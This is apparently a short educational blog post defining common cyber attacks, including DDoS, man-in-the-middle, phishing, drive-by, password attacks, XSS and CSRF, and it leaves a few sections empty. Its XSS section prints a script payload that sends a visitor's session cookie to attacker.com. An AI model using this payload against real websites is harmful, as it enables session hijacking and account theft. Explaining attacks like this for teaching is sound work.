---
layout : post
title : Cyber Attacks
comments: true
categories : [Security]
---

### Dos/DDos Attack

   Dos - Denial-of-service, overwhelms a system’s resources so that
      it cannot respond to service requests.

   DDos - distributed denial-of-service

   If DoS attacks are performed by many computers at the
   same time. This scenario of attack is known as a DDoS.
   This type of attack can be even more difficult to overcome due to the
   attacker appearing from many different IP addresses around the world
   simultaneously, making determining the source of the attack even more
   difficult for network administrators.

### MitM attack

MitM : Man-in-the-middle

Here are some common types of man-in-the-middle attacks:

1. Session hijacking
2. IP Spoofing
3. Replay

### Phishing attack

It could involve an attachment to an email that loads malware onto your computer.
It could also be a link to an illegitimate website that can trick you into
downloading malware or handing over your personal information.

### Drive-by attack

Hackers look for insecure websites and plant a malicious script into HTTP or PHP
code on one of the pages. This script might install malware directly onto the
computer of someone who visits the site, or it might re-direct the victim to a
site controlled by the hackers.

These attacks are known as drive-by because they don’t require any action
on the victim’s part except visiting the compromised website.

### Password attack

1. Brute-force password guessing means using a random approach by trying
different passwords and hoping that one work

2. dictionary attack - One approach is to copy an encrypted file that
contains the passwords, apply the same encryption to a dictionary of commonly
used passwords, and compare the results.

### SQL injection attack

### XSS attack

XSS : Cross-site scripting

in this case the website itself is not being attacked. Instead, the malicious
code the attacker has injected only runs in the user's browser when they visit
the attacked website, and it goes after the visitor directly, not the website.

For example, this server code:

```javascript
response.write(“Good morning, ” + request.getParameter(“Name”));
```

Instead, an attacker can inject a malicious payload:

```javascript
Good Morning, Boss<script>document.location=’http://attacker.com/?cookie=’
+document.cookie</script>
```

which will be executed by the user’s browser, sending their session cookie to
the attacker and allowing the attacker to hijack the session.

### CSRF or XSRF attack

CSRF : Cross-site request forgery

unathorized commands are sent from the user's browser to a web site

### Eavesdropping attack

An attacker can install network monitors such as sniffers on a server or
computer to perform an eavesdropping attack and intercept data as it is
being transmitted.

### Birthday attack

### Malware attack

For example, Macro viruses in world/excel or file infectors(such as .exe files)
